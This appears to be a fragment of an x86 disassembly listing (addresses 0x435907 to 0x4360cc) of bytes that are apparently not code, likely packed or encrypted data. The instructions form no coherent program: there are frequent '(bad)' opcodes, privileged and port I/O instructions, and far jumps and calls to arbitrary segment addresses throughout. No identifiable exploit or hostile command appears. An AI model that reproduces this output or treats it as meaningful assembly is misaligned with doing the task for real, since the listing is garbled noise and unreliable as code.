  435907:	loope  0x43590e
  435909:	sbb    BYTE PTR [edi-0x43],ah
  43590c:	and    eax,0x436f6179
  435911:	shr    BYTE PTR [edi],1
  435913:	stc    
  435914:	fist   WORD PTR ss:[di]
  435918:	and    dl,BYTE PTR [ecx+0x2]
  43591b:	mov    cl,0xc3
  43591d:	gs pop esp
  43591f:	or     eax,0xcd87b91e
  435924:	jg     0x43592d
  435926:	push   edx
  435927:	mov    esp,0xfbab9abb
  43592c:	push   0xcc443f39
  435931:	sbb    BYTE PTR [ebp-0x79],ah
  435934:	cwde   
  435935:	mov    bh,0xba
  435937:	les    esp,FWORD PTR [eax+0x13]
  43593a:	cli    
  43593b:	popa   
  43593c:	ss int 0xbf
  43593f:	jecxz  0x435965
  435941:	in     eax,0xdf
  435943:	test   BYTE PTR [esi],dh
  435945:	adc    ecx,DWORD PTR [ebx-0x75]
  435948:	loope  0x435914
  43594a:	dec    edx
  43594b:	or     al,0xeb
  43594d:	fisubr DWORD PTR [eax+edi*1-0xa]
  435951:	shl    DWORD PTR [eax-0x628c1edc],1
  435957:	add    DWORD PTR [esi],esp
  435959:	mov    eax,ds:0x4de07443
  43595e:	inc    ebp
  43595f:	mov    ebp,0x1b91e91e
  435964:	rol    BYTE PTR [eax],cl
  435966:	fiadd  WORD PTR [edx+0x1d0ba559]
  43596c:	outs   dx,BYTE PTR ds:[esi]
  43596d:	sub    bl,BYTE PTR [esp+edx*1]
  435970:	neg    ch
  435972:	push   ebx
  435973:	(bad)  
  435974:	fwait
  435975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435976:	mov    ebp,eax
  435978:	ficom  DWORD PTR [ecx+0x7227307f]
  43597e:	int    0x9
  435980:	and    DWORD PTR [ebp-0x29421a09],0x14
  435987:	clc    
  435988:	mov    ebp,DWORD PTR [ecx]
  43598a:	stos   DWORD PTR es:[edi],eax
  43598b:	and    al,0x5b
  43598d:	xchg   ebx,eax
  43598e:	mov    bh,0xe9
  435990:	add    cl,BYTE PTR [ebx-0x44]
  435993:	or     dl,cl
  435995:	jecxz  0x43595c
  435997:	scas   al,BYTE PTR es:[edi]
  435998:	jno    0x435926
  43599a:	mov    ch,0x44
  43599c:	rcl    dh,cl
  43599e:	jb     0x435961
  4359a0:	inc    esp
  4359a1:	lock mov dh,0xf4
  4359a4:	cmp    BYTE PTR [edi-0x37aa40f5],dl
  4359aa:	sbb    al,0xe5
  4359ac:	test   eax,0x25eec891
  4359b1:	fld    DWORD PTR [edx]
  4359b3:	outs   dx,BYTE PTR ds:[esi]
  4359b4:	mov    ds:0xffc37886,al
  4359b9:	fimul  DWORD PTR [ecx+0x9cba9bd]
  4359bf:	mov    eax,ds:0x8cbc133d
  4359c4:	pop    ebx
  4359c5:	rcr    bl,cl
  4359c7:	cdq    
  4359c8:	es and al,0xbb
  4359cb:	hlt    
  4359cc:	test   al,0x90
  4359ce:	xor    ch,ah
  4359d0:	mov    ch,0x25
  4359d2:	clc    
  4359d3:	out    0x2d,al
  4359d5:	xchg   ebp,eax
  4359d6:	in     al,dx
  4359d7:	cld    
  4359d8:	pop    ebx
  4359d9:	pop    ebx
  4359da:	inc    edx
  4359db:	icebp  
  4359dc:	sbb    BYTE PTR [ecx+0x2b66e624],bl
  4359e2:	xchg   bh,cl
  4359e4:	cmc    
  4359e5:	pop    eax
  4359e6:	stos   BYTE PTR es:[edi],al
  4359e7:	icebp  
  4359e8:	jmp    0x19a:0x1810617
  4359ef:	into   
  4359f0:	mov    ds:0xd1890a37,ax
  4359f6:	inc    edx
  4359f7:	stos   BYTE PTR es:[edi],al
  4359f8:	scas   eax,DWORD PTR es:[edi]
  4359f9:	pushf  
  4359fa:	dec    ebx
  4359fb:	jno    0x435a44
  4359fd:	pop    eax
  4359fe:	int    0x6e
  435a00:	xor    cl,BYTE PTR [ecx]
  435a02:	jl     0x4359d9
  435a04:	sub    BYTE PTR [edx-0x38bf7b31],al
  435a0a:	(bad)  
  435a0b:	mov    cl,0x8b
  435a0d:	sahf   
  435a0e:	mov    ebx,0x7749c6a0
  435a13:	js     0x435a1b
  435a15:	xor    al,bl
  435a17:	or     eax,0x233017fc
  435a1c:	in     eax,dx
  435a1d:	mov    eax,ds:0xb66cf6a3
  435a22:	mov    esi,0xb9c9a64
  435a27:	mov    WORD PTR [edx-0x468f3265],ds
  435a2d:	cmovns esp,esi
  435a30:	dec    ebp
  435a31:	test   al,0xb7
  435a33:	aam    0xfa
  435a35:	push   0x63e9c3ca
  435a3a:	xchg   ebp,eax
  435a3b:	pusha  
  435a3c:	je     0x435a4b
  435a3e:	aam    0xe5
  435a40:	sbb    ch,BYTE PTR [ecx-0x41b0fc]
  435a46:	gs inc edx
  435a48:	or     eax,0x21c34f3a
  435a4d:	push   ecx
  435a4e:	stos   BYTE PTR es:[edi],al
  435a4f:	sbb    edx,DWORD PTR [edi+0x16]
  435a52:	(bad)  
  435a53:	mov    cs,edx
  435a55:	imul   ebp,DWORD PTR [esi],0x4b9cfde9
  435a5b:	fcom   st(0)
  435a5d:	into   
  435a5e:	mov    ah,BYTE PTR [esi+0x21a21366]
  435a64:	add    al,0x66
  435a66:	adc    al,0x82
  435a68:	sub    ah,dl
  435a6a:	mov    ah,0xfe
  435a6c:	and    edi,DWORD PTR [ebx-0x57349b0d]
  435a72:	jnp    0x435a85
  435a74:	mov    ch,0x9f
  435a76:	mov    bl,BYTE PTR [edi+0x52f1c924]
  435a7c:	push   es
  435a7d:	cmp    ecx,ecx
  435a7f:	mov    eax,ds:0x357a1ab1
  435a84:	add    al,0xa9
  435a86:	sub    ecx,ebp
  435a88:	cmp    DWORD PTR [ebp+ebx*8+0xb],esp
  435a8c:	shr    DWORD PTR [edx-0x3c3559f4],1
  435a92:	mov    edi,0x639b9e44
  435a97:	shl    BYTE PTR ds:0x2e77c8f,cl
  435a9d:	call   0xea5188f6
  435aa2:	shl    BYTE PTR [edx],0xc7
  435aa5:	mov    ds:0x67e736dd,al
  435aaa:	mov    WORD PTR [esi-0x7e9e14aa],?
  435ab0:	sbb    ecx,ecx
  435ab2:	in     eax,0x77
  435ab4:	or     eax,0xa5c21b83
  435ab9:	xlat   BYTE PTR ds:[ebx]
  435aba:	mov    bh,0x44
  435abc:	or     al,0x7e
  435abe:	adc    al,0x9c
  435ac0:	mov    ch,0xe6
  435ac2:	pop    esi
  435ac3:	out    0x17,eax
  435ac5:	xor    dh,dl
  435ac7:	jo     0x435b34
  435ac9:	leave  
  435aca:	sub    cl,cl
  435acc:	test   eax,0xf4247c47
  435ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435ad2:	mov    edx,0x3d66d510
  435ad7:	lock ins BYTE PTR es:[edi],dx
  435ad9:	test   al,0x2c
  435adb:	jmp    0x8ca3:0x4c1a20c7
  435ae2:	mov    bh,0x4
  435ae4:	pop    es
  435ae5:	leave  
  435ae6:	ins    DWORD PTR es:[edi],dx
  435ae7:	ret    0x2447
  435aea:	retf   
  435aeb:	scas   eax,DWORD PTR es:[edi]
  435aec:	push   0x70
  435aee:	pop    edx
  435aef:	(bad)  [eax+0x1d46bda9]
  435af5:	jmp    0xf0beb3c0
  435afa:	fcmovb st,st(2)
  435afc:	sbb    DWORD PTR [esi],esi
  435afe:	push   ebx
  435aff:	cmp    al,0x56
  435b01:	(bad)  [edi]
  435b03:	fnstcw WORD PTR [eax]
  435b05:	rcl    eax,1
  435b07:	mov    bh,0x18
  435b09:	pop    ebp
  435b0a:	mov    bl,0xcd
  435b0c:	and    DWORD PTR [ecx+0x62de5d96],ebp
  435b12:	inc    edx
  435b13:	mov    al,0x9f
  435b15:	cmp    ch,0x2f
  435b18:	retf   0x3b6
  435b1b:	xchg   esi,eax
  435b1c:	push   ss
  435b1d:	mov    ch,0xee
  435b1f:	outs   dx,DWORD PTR ds:[esi]
  435b20:	cld    
  435b21:	sbb    al,dh
  435b23:	jmp    0x435b9a
  435b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435b26:	xor    ebx,eax
  435b28:	add    ch,BYTE PTR [edx-0x655f4af4]
  435b2e:	mov    ebx,0x27e5d17
  435b33:	dec    esi
  435b34:	xchg   ebx,eax
  435b35:	jg     0x435b0e
  435b37:	es aam 0xdd
  435b3a:	sub    eax,DWORD PTR [ebp+0x25]
  435b3d:	jge    0x435b22
  435b3f:	sbb    BYTE PTR [ecx],0xa2
  435b42:	imul   edx,DWORD PTR [ecx+0x77d83e91],0xffffffb7
  435b49:	push   ebx
  435b4a:	dec    esp
  435b4b:	or     eax,0xf4b37524
  435b50:	mov    BYTE PTR ss:[edi-0x40],ch
  435b54:	inc    ecx
  435b55:	fwait
  435b56:	stos   DWORD PTR es:[edi],eax
  435b57:	ins    DWORD PTR es:[edi],dx
  435b58:	test   ax,0xc67
  435b5c:	in     eax,dx
  435b5d:	or     al,0x59
  435b5f:	sub    DWORD PTR [eax+0x6a94e5b2],esi
  435b65:	lods   eax,DWORD PTR ds:[esi]
  435b66:	jae    0x435b3f
  435b68:	pop    esi
  435b69:	out    0x95,eax
  435b6b:	sahf   
  435b6c:	mov    ch,0xbf
  435b6e:	sub    esi,esp
  435b70:	loop   0x435af7
  435b72:	ds sahf 
  435b74:	and    al,0xa9
  435b76:	in     al,dx
  435b77:	loopne 0x435b9f
  435b79:	push   eax
  435b7a:	mov    bh,0x3f
  435b7c:	xchg   ebx,eax
  435b7d:	mov    al,ds:0xcd5e9ccb
  435b82:	add    esp,0x22b9bf3b
  435b88:	push   ecx
  435b89:	xor    BYTE PTR [ebp+0x5c5eb324],0xb8
  435b90:	jmp    0xce2471c8
  435b95:	sub    BYTE PTR [ecx-0x3da9f292],0xf0
  435b9c:	pop    esp
  435b9d:	aam    0xa0
  435b9f:	sti    
  435ba0:	icebp  
  435ba1:	sub    eax,0xa4ede4b7
  435ba6:	jb     0x435c09
  435ba8:	aad    0x21
  435baa:	enter  0xf0e7,0x40
  435bae:	cmc    
  435baf:	outs   dx,BYTE PTR ds:[esi]
  435bb0:	and    al,0x99
  435bb2:	aas    
  435bb3:	out    dx,al
  435bb4:	sbb    DWORD PTR [edx-0x3b4eddff],ebx
  435bba:	lods   al,BYTE PTR ds:[esi]
  435bbb:	adc    al,0x92
  435bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435bbe:	pop    ebx
  435bbf:	data16 (bad) 
  435bc1:	dec    ebp
  435bc2:	test   eax,0x9dc9206f
  435bc7:	sub    DWORD PTR [eax],ecx
  435bc9:	pop    ebp
  435bca:	sti    
  435bcb:	iret   
  435bcc:	xchg   edx,eax
  435bcd:	test   al,0x7b
  435bcf:	repnz ins BYTE PTR es:[edi],dx
  435bd1:	outs   dx,BYTE PTR ds:[esi]
  435bd2:	pop    edi
  435bd3:	neg    BYTE PTR [ebx+eiz*8]
  435bd6:	aas    
  435bd7:	push   ecx
  435bd8:	lods   eax,DWORD PTR ds:[esi]
  435bd9:	jg     0x435b8c
  435bdb:	mov    ah,0x28
  435bdd:	gs fs jb 0x435bda
  435be1:	ret    
  435be2:	imul   edx,DWORD PTR [ebp+0x4d621574],0x28
  435be9:	(bad)  
  435bea:	mov    ch,0x84
  435bec:	or     edx,ecx
  435bee:	xchg   ebx,eax
  435bef:	ds pop ebp
  435bf1:	mov    al,0x3f
  435bf3:	adc    al,0xf0
  435bf5:	cmc    
  435bf6:	inc    esp
  435bf7:	retf   0xaab9
  435bfa:	cmp    edx,edx
  435bfc:	mov    ebx,0xfbd7f910
  435c01:	fucomip st,st(1)
  435c03:	mov    bh,dh
  435c05:	mov    bl,BYTE PTR [eax+0x3e]
  435c08:	sbb    BYTE PTR [ecx-0x74c20f2f],ch
  435c0e:	(bad)  
  435c0f:	iret   
  435c10:	jbe    0x435c5e
  435c12:	jecxz  0x435c2a
  435c14:	dec    edx
  435c15:	xor    ch,BYTE PTR [edx-0x43481917]
  435c1b:	xor    ebx,edx
  435c1d:	xor    esi,DWORD PTR [eax-0x5e8c64ac]
  435c23:	jmp    0x435c0e
  435c25:	xchg   dh,al
  435c27:	mov    ah,0x5c
  435c29:	pop    eax
  435c2a:	mov    esp,0x5b21cc9c
  435c2f:	ret    0x943d
  435c32:	and    eax,0xe11919a5
  435c37:	xchg   edi,eax
  435c38:	lds    esp,FWORD PTR [edi-0x49ac635]
  435c3e:	pop    esp
  435c3f:	xchg   edi,eax
  435c40:	mov    bl,0x3b
  435c42:	lods   al,BYTE PTR ds:[esi]
  435c43:	and    DWORD PTR [edx],edi
  435c45:	repz mov cl,0x24
  435c48:	inc    esp
  435c49:	(bad)  
  435c4b:	xor    ebx,edx
  435c4d:	mov    ch,0x33
  435c4f:	icebp  
  435c50:	test   edi,ebp
  435c52:	sbb    ch,dh
  435c54:	xchg   ecx,eax
  435c55:	cmp    DWORD PTR [ecx+ebp*2],ebp
  435c58:	sbb    eax,0x3edba2e9
  435c5d:	loope  0x435c3a
  435c5f:	xor    al,0x57
  435c61:	sar    BYTE PTR [ebx-0x2e],1
  435c64:	or     BYTE PTR [edx-0x2c5e2043],ch
  435c6a:	mov    edi,0xa6295512
  435c6f:	xor    DWORD PTR [edx],ebp
  435c71:	data16 sub al,0xc6
  435c74:	div    edi
  435c76:	sti    
  435c77:	dec    ebp
  435c78:	lds    esi,FWORD PTR [eax]
  435c7a:	adc    al,0xfb
  435c7c:	jnp    0x435c63
  435c7e:	pop    eax
  435c7f:	clc    
  435c80:	cli    
  435c81:	cmp    BYTE PTR [eax],bl
  435c83:	stc    
  435c84:	push   esp
  435c85:	nop
  435c86:	mov    edi,0xb61f6104
  435c8b:	js     0x435c62
  435c8d:	fcmovnu st,st(5)
  435c8f:	in     eax,0xc3
  435c91:	idiv   BYTE PTR [eax+edi*2]
  435c94:	and    ebp,ecx
  435c96:	outs   dx,DWORD PTR ds:[esi]
  435c97:	inc    edx
  435c98:	pop    ebx
  435c99:	push   cs
  435c9a:	inc    ebp
  435c9b:	hlt    
  435c9c:	xor    eax,0x55a81ba7
  435ca1:	add    ebx,esi
  435ca3:	popf   
  435ca4:	in     eax,0x57
  435ca6:	(bad)  
  435ca7:	adc    al,0x46
  435ca9:	aad    0xc8
  435cab:	xchg   esp,eax
  435cac:	adc    eax,DWORD PTR [edx-0x27437a3a]
  435cb2:	cmp    eax,DWORD PTR [ebx]
  435cb4:	cli    
  435cb5:	sbb    dl,cl
  435cb7:	mov    gs,eax
  435cb9:	call   0x8a88:0x951df655
  435cc0:	mov    WORD PTR [edx],es
  435cc2:	sbb    eax,0xc138c50a
  435cc7:	jmp    0xd91a:0x45aead82
  435cce:	int    0xcd
  435cd0:	inc    esp
  435cd1:	aaa    
  435cd2:	fldenv [ebp+0x9]
  435cd5:	retf   
  435cd6:	imul   edx,eax,0x4f
  435cd9:	or     eax,DWORD PTR [esp+ecx*1]
  435cdc:	sbb    DWORD PTR [ebx+0x691cac9b],eax
  435ce2:	cli    
  435ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435ce4:	loope  0x435ce8
  435ce6:	scas   al,BYTE PTR es:[edi]
  435ce7:	jl     0x435d36
  435ce9:	lahf   
  435cea:	jnp    0x435d2e
  435cec:	fbld   TBYTE PTR [edi+0x1c]
  435cef:	sub    ebx,DWORD PTR [edi-0x548982ab]
  435cf5:	cmp    al,0xb9
  435cf7:	mov    ah,0x77
  435cf9:	xchg   DWORD PTR [edx],esp
  435cfb:	mov    bh,0xe5
  435cfd:	not    BYTE PTR [esi-0x5ee78e0f]
  435d03:	lock fisttp QWORD PTR [edx-0x54]
  435d07:	sbb    DWORD PTR [esi],0x82462d21
  435d0d:	add    eax,0x4aa5fa06
  435d12:	mov    ch,0xec
  435d14:	pop    esp
  435d15:	mov    esp,0xd91719fa
  435d1a:	push   ss
  435d1b:	cli    
  435d1c:	xchg   ecx,eax
  435d1d:	and    esp,DWORD PTR [ecx-0x67]
  435d20:	push   esp
  435d21:	mov    ds:0x137928fb,al
  435d26:	leave  
  435d27:	je     0x435cfa
  435d29:	into   
  435d2a:	inc    ebx
  435d2b:	retf   
  435d2c:	jl     0x435d66
  435d2e:	mov    esi,0xa5f51f54
  435d33:	loop   0x435d5a
  435d35:	hlt    
  435d36:	loopne 0x435d2a
  435d38:	inc    esp
  435d39:	int3   
  435d3a:	paddq  mm4,mm4
  435d3d:	(bad)  
  435d3e:	(bad)  [ebx]
  435d40:	das    
  435d41:	sub    al,0xe2
  435d43:	xchg   esp,eax
  435d44:	cli    
  435d45:	pop    ds
  435d46:	or     ch,ch
  435d48:	add    bh,BYTE PTR [ebx+0x7c]
  435d4b:	out    0x46,al
  435d4d:	cmova  esp,DWORD PTR [esi]
  435d50:	push   cs
  435d51:	(bad)  
  435d52:	mov    esi,0x720a476c
  435d57:	icebp  
  435d58:	add    BYTE PTR [ebp+0x486be72b],ah
  435d5e:	xchg   DWORD PTR [ecx],ecx
  435d60:	mov    al,BYTE PTR [eax+0x66]
  435d63:	adc    BYTE PTR [ebx+edi*4-0x56],ch
  435d67:	inc    ebp
  435d68:	sub    BYTE PTR [eax-0x79c1335b],ah
  435d6e:	xchg   ecx,edx
  435d70:	mov    bh,0x71
  435d72:	outs   dx,BYTE PTR ds:[esi]
  435d73:	dec    ecx
  435d74:	cmc    
  435d75:	imul   ecx,ebx,0xffffffe9
  435d78:	and    BYTE PTR [edi-0x1],bh
  435d7b:	jbe    0x435da4
  435d7d:	aaa    
  435d7e:	mov    edx,0x191455a4
  435d83:	inc    edi
  435d84:	inc    esi
  435d85:	cmp    DWORD PTR [ecx+0x16],esp
  435d88:	push   ecx
  435d89:	mov    al,0x1e
  435d8b:	mov    al,ds:0x71330888
  435d90:	es out dx,al
  435d92:	mov    edi,0x8d4708a4
  435d97:	pop    ebp
  435d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d99:	jne    0x435d9a
  435d9b:	loop   0x435da4
  435d9d:	mov    ch,0x2f
  435d9f:	mov    ebx,0x674f7946
  435da4:	adc    al,0x88
  435da6:	mov    edx,0xb7c0176d
  435dab:	test   ah,bh
  435dad:	xchg   esp,eax
  435dae:	shr    BYTE PTR [ebp-0xb9e8adb],cl
  435db4:	sub    dl,BYTE PTR [ebx]
  435db6:	sbb    al,0x93
  435db8:	and    edi,DWORD PTR [ecx]
  435dba:	sub    di,si
  435dbd:	int3   
  435dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435dbf:	jo     0x435db5
  435dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435dc2:	sbb    edx,ecx
  435dc4:	das    
  435dc5:	jbe    0x435df2
  435dc7:	stos   BYTE PTR es:[edi],al
  435dc8:	rol    DWORD PTR [ebx+0x15],1
  435dcb:	imul   DWORD PTR cs:[esi-0x150b2bc9]
  435dd2:	jp     0x435dd3
  435dd4:	mov    cl,0x23
  435dd6:	pushf  
  435dd7:	cmc    
  435dd8:	loopne 0x435d7b
  435dda:	sbb    BYTE PTR [esi+0x13],0x7a
  435dde:	ficom  WORD PTR [esi]
  435de0:	and    al,0xa3
  435de2:	sbb    DWORD PTR [ecx],0xafc12dc5
  435de8:	inc    esi
  435de9:	fnstsw ax
  435deb:	sbb    DWORD PTR [esp+eiz*2+0x4d760ca9],edx
  435df2:	mov    edi,0x9c1d6060
  435df7:	(bad)
  435dfa:	mov    edx,0x49e825f8
  435dff:	(bad)  
  435e00:	gs popf 
  435e02:	xchg   ecx,eax
  435e03:	out    0x44,al
  435e05:	mov    cl,0x2d
  435e07:	inc    ecx
  435e08:	and    eax,0xa07e4e79
  435e0d:	call   0x4fdb:0xab4a8926
  435e14:	xchg   BYTE PTR [ecx],al
  435e16:	sbb    eax,0x3a265ce1
  435e1b:	sub    al,0xa8
  435e1d:	jl     0x435dc5
  435e1f:	fs std 
  435e21:	sub    BYTE PTR [edi-0xe],al
  435e24:	jno    0x435ddb
  435e26:	js     0x435dff
  435e28:	xor    al,0x9c
  435e2a:	sti    
  435e2b:	dec    ebx
  435e2c:	push   edi
  435e2d:	mov    eax,ds:0x62d27476
  435e32:	test   al,0xd9
  435e34:	icebp  
  435e35:	fdivr  DWORD PTR [ecx+0x1b29e944]
  435e3b:	ss aad 0xa7
  435e3e:	fcmovne st,st(6)
  435e40:	stos   DWORD PTR es:[edi],eax
  435e41:	mov    al,ds:0xefaca088
  435e46:	and    bl,BYTE PTR [edi]
  435e48:	push   eax
  435e49:	xchg   esi,eax
  435e4a:	xchg   esp,eax
  435e4b:	inc    ebp
  435e4c:	and    DWORD PTR [edi],ecx
  435e4e:	mov    al,ds:0x5a9d1dfe
  435e53:	mul    BYTE PTR [ecx-0x7f]
  435e56:	cld    
  435e57:	add    ecx,ebp
  435e59:	push   edi
  435e5a:	pop    ss
  435e5b:	jb     0x435e2a
  435e5d:	pop    ebx
  435e5e:	mov    ebx,0x17192190
  435e63:	pop    esp
  435e64:	stos   BYTE PTR es:[edi],al
  435e65:	lods   al,BYTE PTR ds:[esi]
  435e66:	mov    dl,0xb7
  435e68:	pusha  
  435e69:	call   0x674b:0xf2635f1b
  435e70:	cmp    DWORD PTR ds:[ebx+0x1088d888],ecx
  435e77:	add    al,0x76
  435e79:	cmc    
  435e7a:	nop
  435e7b:	mov    ch,0xe7
  435e7d:	mov    al,ds:0x9dbaed47
  435e82:	dec    ebx
  435e83:	mov    dl,0xa2
  435e85:	stos   DWORD PTR es:[edi],eax
  435e86:	dec    ebp
  435e87:	scas   eax,DWORD PTR es:[edi]
  435e88:	les    esi,FWORD PTR [edx+0x3b]
  435e8b:	xchg   ecx,eax
  435e8c:	sbb    edx,DWORD PTR [edi-0x4c]
  435e8f:	fs scas al,BYTE PTR es:[edi]
  435e91:	into   
  435e92:	(bad)  
  435e93:	cmp    BYTE PTR ds:0x75ecf7b5,dl
  435e99:	(bad)  
  435e9a:	xchg   ecx,eax
  435e9b:	stos   BYTE PTR es:[edi],al
  435e9c:	xor    al,0x49
  435e9e:	ds pusha 
  435ea0:	mov    WORD PTR [ebp-0x1c],cs
  435ea3:	push   ebx
  435ea4:	sbb    eax,0x6531229b
  435ea9:	add    edx,DWORD PTR [esi-0x15]
  435eac:	les    esp,FWORD PTR [edi+esi*2+0x4c]
  435eb0:	sbb    eax,0x166be559
  435eb5:	js     0x435e5a
  435eb7:	retf   
  435eb8:	js     0x435e65
  435eba:	cmp    edi,DWORD PTR [edx+0x11]
  435ebd:	sbb    al,0xe6
  435ebf:	lahf   
  435ec0:	pop    esi
  435ec1:	(bad)  [ecx+0x39]
  435ec4:	sub    bl,BYTE PTR gs:[esp+ecx*4+0x7efd2231]
  435ecc:	ret    0xc3c9
  435ecf:	and    BYTE PTR [esi+0x1fe03098],0xf3
  435ed6:	leave  
  435ed7:	mov    bl,0xc2
  435ed9:	jg     0x435ecd
  435edb:	(bad)  
  435edc:	pop    ebx
  435edd:	pop    edi
  435ede:	mov    edx,0xccd22034
  435ee3:	adc    al,BYTE PTR [ebp+0x78]
  435ee6:	(bad)  
  435ee8:	jns    0x435f29
  435eea:	push   ebx
  435eeb:	sbb    BYTE PTR [edx],0x29
  435eee:	jge    0x435eb7
  435ef0:	or     eax,0x6c739cfb
  435ef5:	mov    eax,ds:0xed011e3b
  435efa:	dec    eax
  435efb:	inc    ebp
  435efc:	in     eax,0xb2
  435efe:	jns    0x435ed5
  435f00:	lods   eax,DWORD PTR ds:[esi]
  435f01:	sbb    al,0xab
  435f03:	lds    eax,FWORD PTR ds:0xe3f6c273
  435f09:	enter  0x756e,0x25
  435f0d:	add    ecx,DWORD PTR [eax-0x51cbc516]
  435f13:	mov    ds:0xdb0ea922,al
  435f18:	mov    eax,0xd1cceca8
  435f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435f1e:	mov    ebx,0xed35ea43
  435f23:	popa   
  435f24:	test   esp,esi
  435f26:	icebp  
  435f27:	push   eax
  435f28:	mov    BYTE PTR [ebp-0x7d],ah
  435f2b:	cwde   
  435f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435f2d:	popa   
  435f2e:	mov    edi,0xa0588f84
  435f33:	pop    esi
  435f34:	mov    dh,0x72
  435f36:	or     DWORD PTR [ebx],eax
  435f38:	sub    eax,0xc2e9e7c3
  435f3d:	sub    al,0xd2
  435f3f:	call   0x84facdaf
  435f44:	xchg   ecx,eax
  435f45:	test   BYTE PTR [edx-0x62],bh
  435f48:	mov    ch,0x9a
  435f4a:	mov    ecx,0x774791e9
  435f4f:	adc    eax,0x7038e925
  435f54:	xchg   ebx,ebx
  435f56:	call   0x4be5fb3e
  435f5b:	push   esi
  435f5c:	sti    
  435f5d:	sbb    ecx,DWORD PTR [eax+0x7b]
  435f60:	pop    edx
  435f61:	fmul   st,st(1)
  435f63:	cdq    
  435f64:	jbe    0x435fce
  435f66:	mov    esi,0xd879bc4
  435f6b:	retf   0xa5a5
  435f6e:	out    dx,eax
  435f6f:	icebp  
  435f70:	mov    edi,0x1a03b364
  435f75:	test   eax,0x618c27b1
  435f7a:	mov    esi,DWORD PTR [esi]
  435f7c:	push   esp
  435f7d:	dec    ebp
  435f7e:	mov    WORD PTR [esi+0x65c6343c],?
  435f84:	adc    al,0x29
  435f86:	mov    dh,0x64
  435f88:	xor    ecx,DWORD PTR [ecx+0x23]
  435f8b:	sub    BYTE PTR [edi],bl
  435f8d:	cmp    ebp,ecx
  435f8f:	imul   edx,edi,0xd90a9eb5
  435f95:	test   al,0xc
  435f97:	call   0xc9d:0x84b1943c
  435f9e:	sub    ah,BYTE PTR [eax-0x3370d6dc]
  435fa4:	ret    0xc805
  435fa7:	mov    dh,0x24
  435fa9:	mov    eax,ds:0xc49c077b
  435fae:	cmp    DWORD PTR [ecx+0x6d],0x7ed68819
  435fb5:	mov    eax,0x22abd331
  435fba:	cli    
  435fbb:	and    al,0x30
  435fbd:	adc    eax,0x98e22e24
  435fc2:	xor    eax,0xab9daebd
  435fc7:	hlt    
  435fc8:	add    esi,edi
  435fca:	push   cs
  435fcb:	mov    DWORD PTR [ebx],edi
  435fcd:	in     eax,dx
  435fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435fcf:	inc    esi
  435fd0:	iret   
  435fd1:	(bad)  
  435fd2:	mov    bh,0x94
  435fd4:	xchg   DWORD PTR [edx+0x73],edx
  435fd7:	sbb    eax,0xf858ab95
  435fdc:	ins    DWORD PTR es:[edi],dx
  435fdd:	in     al,dx
  435fde:	call   0xb729:0xc69309
  435fe5:	(bad)  
  435fe6:	mov    cl,0xc4
  435fe8:	not    ebx
  435fea:	cmp    BYTE PTR [ecx],0xb5
  435fed:	xchg   esp,eax
  435fee:	pushf  
  435fef:	out    dx,al
  435ff0:	das    
  435ff1:	outs   dx,DWORD PTR ds:[esi]
  435ff2:	cmp    bh,BYTE PTR [esi-0x7e5966e2]
  435ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435ff9:	pop    ds
  435ffa:	fstp   DWORD PTR ds:0x5719d9d9
  436000:	jne    0x436051
  436002:	cmp    esp,esi
  436004:	or     eax,0x5d995004
  436009:	dec    ebx
  43600a:	pusha  
  43600b:	jbe    0x436013
  43600d:	stos   BYTE PTR es:[edi],al
  43600e:	add    ebx,DWORD PTR [eax-0x5]
  436011:	add    BYTE PTR [ecx+ebp*8],al
  436014:	add    al,0xa2
  436016:	mov    ebx,0xe583b8aa
  43601b:	mov    ah,0x51
  43601d:	push   esi
  43601e:	push   eax
  43601f:	jmp    0xf355:0x14bedaae
  436026:	shr    BYTE PTR [ebp+eax*4+0x2d],cl
  43602a:	xor    eax,0x5a2e287e
  436030:	adc    edx,ebp
  436032:	mov    ch,0xd5
  436034:	inc    eax
  436035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436036:	inc    edi
  436037:	loop   0x43601d
  436039:	repz pusha 
  43603b:	retf   
  43603c:	aad    0x1
  43603e:	sub    ecx,esi
  436040:	and    al,0x24
  436042:	std    
  436043:	cwde   
  436044:	hlt    
  436045:	or     al,0x56
  436047:	imul   edx,DWORD PTR [ebp+0x9],0xcd72f9c7
  43604e:	pusha  
  43604f:	or     eax,0x27ba12c
  436054:	ins    BYTE PTR es:[edi],dx
  436055:	dec    ebx
  436056:	xchg   ebp,esp
  436058:	mov    WORD PTR [eax],cs
  43605a:	jno    0x436040
  43605c:	clc    
  43605d:	adc    bh,BYTE PTR [esp+esi*2+0xdfa8cca]
  436064:	fnstenv [ebx+0x1]
  436067:	jae    0x436003
  436069:	scas   al,BYTE PTR es:[edi]
  43606a:	mov    ecx,0xc87f4d94
  43606f:	push   ds
  436070:	jecxz  0x436091
  436072:	mov    ecx,0x81ad1284
  436077:	pop    esp
  436078:	add    eax,0x76ed267a
  43607d:	inc    ecx
  43607e:	int    0x13
  436080:	sbb    eax,0xc50ca029
  436085:	dec    ebp
  436086:	mov    dh,0xfd
  436088:	ficomp DWORD PTR [edx+ebp*1-0x6b342904]
  43608f:	pop    edi
  436090:	sub    eax,0x90ca0fa3
  436095:	jbe    0x4360b6
  436097:	push   esi
  436098:	cmp    DWORD PTR [edx-0x4d],eax
  43609b:	add    al,0x7a
  43609d:	jmp    0x10db6894
  4360a2:	add    eax,0xd8e29770
  4360a7:	or     eax,0xe9460f35
  4360ac:	xor    al,BYTE PTR [edi-0xc]
  4360af:	or     DWORD PTR [esi-0x7a478c61],0xffffffdf
  4360b6:	ja     0x436079
  4360b8:	ins    BYTE PTR es:[edi],dx
  4360b9:	sahf   
  4360ba:	cmp    edx,DWORD PTR ds:0x7f0eeb27
  4360c0:	mov    es,WORD PTR ds:0x291928d6
  4360c6:	mov    esp,0x96badd33
  4360cb:	push   ebp
  4360cc:	push   ss
